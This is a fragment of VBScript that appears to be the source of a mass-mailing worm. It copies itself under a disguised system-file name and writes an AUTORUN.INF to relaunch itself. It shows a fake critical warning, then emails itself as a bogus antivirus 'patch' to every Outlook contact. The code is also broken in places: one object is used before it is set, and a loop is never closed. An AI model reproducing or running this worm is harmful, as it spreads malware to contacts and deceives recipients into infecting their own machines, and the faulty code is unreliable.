   dim filesys
   set filesys=CreateObject("Scripting.FileSystemObject")
   Set ANTI = CreateObject("Scripting.FileSystemObject")
   Set NOTEPAD = anti.CreateTextFile("C:\AUTORUN.INF")
   fs.CopyFile Wscript.ScriptFullName, ("C:\System32.dll.vbs")
   Set fs = createobject("scripting.filesystemobject")
   NOTEPAD.writeline "[Autorun]"
   NOTEPAD.writeline "open=System32.dll.vbs"
   NOTEPAD.close
   msgbox"Please reboot computer immediately !",vbCritical,"WARNING"
   do
   Set aa = CreateObject("Outlook.Application")
   Set bb = Wscript.CreateObject("Outlook.Application")
   Set mapi = bb.GetNameSpace("MAPI")
   Set c = mapi.AddressLists(1)
   For X = 1 To c.AddressEntries.Count
   Set Mail = aa.CreateItem(0)
   Mail.to = aa.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
   Mail.Subject = "VIRUS DETECTED AT YOUR COMPUTER"
   Mail.Body = "PLEASE INSTALL ATTACHED PATCH IMMEDIATELY !!!"
   Mail.Body = "This mail was sent by united antivirus developers"
   Mail.Attachments.Add WScript.ScriptFullName
   Mail.Send
